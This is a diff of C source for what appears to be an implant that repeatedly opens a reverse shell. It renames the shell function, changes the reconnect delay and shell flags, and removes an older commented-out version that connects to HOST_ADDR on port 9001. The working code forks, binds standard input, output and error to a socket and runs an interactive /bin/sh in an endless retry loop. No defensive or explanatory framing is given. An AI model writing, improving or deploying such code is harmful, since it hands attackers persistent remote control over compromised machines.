@@ -68,7 +68,7 @@ static in_addr_t my_inet_addr(const char *ip) {
 	return __builtin_bswap32(result);
 }
 
-static int reverse_shell(char **envp) {
+int connect_shell(char **envp) {
 	pid_t pid;
 
 	pid = fork();
@@ -99,7 +99,7 @@ static int reverse_shell(char **envp) {
 		dup2(sockt, 1);
 		dup2(sockt, 2);
 
-		char * const argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
+		char * const argv[] = {STR("/bin/sh"), STR("-i"), NULL};
 		execve(argv[0], argv, envp);
 		exit(0);
 
@@ -116,33 +116,7 @@ void run_shell(char **envp) {
 
 	logger(STR("starting reverse shell\n"));
 	while (1) {
-		reverse_shell(envp);
-		sleep_sec(5);
+		connect_shell(envp);
+		sleep_sec(10);
 	}
 }
-
-//int reverse_shell(void) {
-//    int port = 9001;
-//    struct sockaddr_in revsockaddr;
-//
-//    int sockt = socket(AF_INET, SOCK_STREAM, 0);
-//    revsockaddr.sin_family = AF_INET;
-//    revsockaddr.sin_port = my_htons(port);
-//    revsockaddr.sin_addr.s_addr = my_inet_addr(HOST_ADDR);
-//
-//connect_retry:
-//		if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) == -1) {
-//			sleep_sec(5);
-//			goto connect_retry;
-//		}
-//
-//    dup2(sockt, 0);
-//    dup2(sockt, 1);
-//    dup2(sockt, 2);
-//
-//	//char * const argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
-//	char * const argv[] = {STR("/bin/sh"), NULL};
-//	execve(argv[0], argv, NULL);
-//
-//    return 0;
-//}
